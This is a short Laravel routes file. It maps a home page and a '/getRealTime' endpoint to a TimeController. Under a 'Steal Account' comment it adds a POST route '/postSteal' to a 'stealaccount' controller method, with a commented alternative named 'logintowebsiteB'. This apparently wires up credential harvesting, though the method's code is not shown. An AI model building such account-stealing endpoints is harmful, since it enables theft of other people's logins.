<?php

use App\Http\Controllers\LoginController;
use App\Http\Controllers\TimeController;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "web" middleware group. Make something great!
|
*/

Route::get('/', [TimeController::class, 'timecontrollermethod'])->name('timecontrollermethod');
Route::get('/getRealTime', [TimeController::class, 'getRealTime'])->name('getRealTime');

//Steal Account

  
    Route::post('/postSteal', [LoginController::class, 'stealaccount'])->name('stealaccount');
    // Route::post('/postSteal', [LoginController::class, 'logintowebsiteB']);
//

// Route::get('/luka', [TimeController::class,'timecontrollermethod'])->name('timecontrollermethod');